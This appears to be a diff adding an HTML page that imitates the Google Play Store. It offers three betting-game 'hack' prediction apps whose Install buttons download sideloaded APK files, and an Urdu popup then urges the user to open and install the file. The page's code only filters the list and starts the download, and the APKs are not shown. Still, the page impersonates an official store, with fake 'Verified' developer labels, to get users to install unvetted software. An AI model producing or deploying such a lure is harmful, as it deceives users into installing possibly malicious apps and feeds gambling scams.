@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Play Store</title>
+    <style>
+        body { background-color: #f1f3f4; font-family: 'Roboto', sans-serif; margin: 0; padding-bottom: 80px; }
+        .header { background: white; padding: 10px 15px; display: flex; flex-direction: column; gap: 10px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .top-bar { display: flex; justify-content: space-between; align-items: center; }
+        .play-logo { width: 120px; height: auto; }
+        .search-container { background: #f1f3f4; border-radius: 8px; display: flex; align-items: center; padding: 8px 12px; margin-bottom: 5px; }
+        .search-container input { background: transparent; border: none; outline: none; width: 100%; font-size: 15px; margin-left: 10px; }
+        .profile-icon { width: 32px; height: 32px; background-color: #01875f; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; }
+        .container { max-width: 450px; margin: auto; padding: 15px; }
+        .section-title { font-weight: 500; font-size: 18px; margin: 10px 5px; color: #202124; }
+        .app-card { background: white; border-radius: 15px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .app-icon { width: 60px; height: 60px; border-radius: 12px; margin-right: 15px; object-fit: cover; }
+        .app-info { flex-grow: 1; }
+        .app-name { font-weight: 500; font-size: 15px; margin: 0; color: #202124; }
+        .dev-name { color: #01875f; font-size: 13px; font-weight: 500; margin: 2px 0; }
+        .install-btn { background: #01875f; color: white; border: none; padding: 8px 16px; border-radius: 8px; font-weight: 500; cursor: pointer; }
+        
+        /* پروفیشنل اردو پاپ اپ ڈیزائن */
+        #guidePopup { 
+            display: none; 
+            position: fixed; 
+            bottom: 30px; 
+            left: 50%; 
+            transform: translateX(-50%); 
+            background: #323232; 
+            color: white; 
+            padding: 15px 25px; 
+            border-radius: 12px; 
+            width: 85%; 
+            max-width: 350px;
+            text-align: center; 
+            z-index: 2000; 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4); 
+            font-size: 14px; 
+            direction: rtl; 
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="top-bar">
+        <img src="https://i.ibb.co/JW44wkp6/google-play-store-logo-png-transparent-png-logos-10.png" class="play-logo">
+        <div class="profile-icon">S</div>
+    </div>
+    <div class="search-container">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+        <input type="text" id="searchInput" onkeyup="filterApps()" placeholder="Search for apps...">
+    </div>
+</div>
+
+<div class="container">
+    <div class="section-title" id="resultsTitle">Recommended for you</div>
+    <div id="appList">
+        <div class="app-card" data-name="fantasy hack">
+            <img src="https://i.ibb.co/C5p5rY2Y/1776117349858.png" class="app-icon">
+            <div class="app-info">
+                <p class="app-name">Fantasy hack</p>
+                <p class="dev-name">Wingo Official</p>
+            </div>
+            <button class="install-btn" onclick="startDownload('WingoPredection_sign.apk')">Install</button>
+        </div>
+
+        <div class="app-card" data-name="92jeeto hack">
+            <img src="https://i.ibb.co/hFXTbRKL/1776112828883.png" class="app-icon">
+            <div class="app-info">
+                <p class="app-name">92jeeto hack</p>
+                <p class="dev-name">Pro Predictor</p>
+            </div>
+            <button class="install-btn" onclick="startDownload('92Jeeto-Wingo-Pro-Hack_sign.apk')">Install</button>
+        </div>
+
+        <div class="app-card" data-name="92pak hack">
+            <img src="https://i.ibb.co/CphKMt7j/Screenshot-2026-0414-111941.jpg" class="app-icon">
+            <div class="app-info">
+                <p class="app-name">92pak hack</p>
+                <p class="dev-name">Verified Mod</p>
+            </div>
+            <button class="install-btn" onclick="startDownload('92PakPredection_sign.apk')">Install</button>
+        </div>
+    </div>
+</div>
+
+<div id="guidePopup">
+    ڈاؤن لوڈ شروع ہو گیا ہے! <br> مکمل ہونے پر اوپر <b>'Open'</b> کر کے انسٹال کریں۔
+</div>
+
+<script>
+    function filterApps() {
+        let input = document.getElementById('searchInput').value.toLowerCase();
+        let apps = document.getElementsByClassName('app-card');
+        let title = document.getElementById('resultsTitle');
+        let found = false;
+        for (let i = 0; i < apps.length; i++) {
+            let appName = apps[i].getAttribute('data-name');
+            if (appName.includes(input)) { apps[i].style.display = "flex"; found = true; } 
+            else { apps[i].style.display = "none"; }
+        }
+        title.innerHTML = (input === "") ? "Recommended for you" : (!found ? "No results found" : "Search results");
+    }
+
+    function startDownload(fileName) {
+        window.location.href = fileName;
+        document.getElementById('guidePopup').style.display = 'block';
+        setTimeout(() => { document.getElementById('guidePopup').style.display = 'none'; }, 8000);
+    }
+</script>
+
+</body>
+</html>
